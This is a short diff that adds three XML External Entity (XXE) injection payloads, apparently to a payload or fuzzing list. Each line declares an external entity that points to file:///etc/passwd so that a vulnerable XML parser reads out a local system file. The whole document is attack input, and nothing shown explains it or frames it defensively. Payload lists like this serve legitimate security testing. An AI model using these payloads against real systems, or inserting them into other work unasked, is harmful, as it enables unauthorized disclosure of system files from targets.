@@ -1,0 +1,3 @@
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
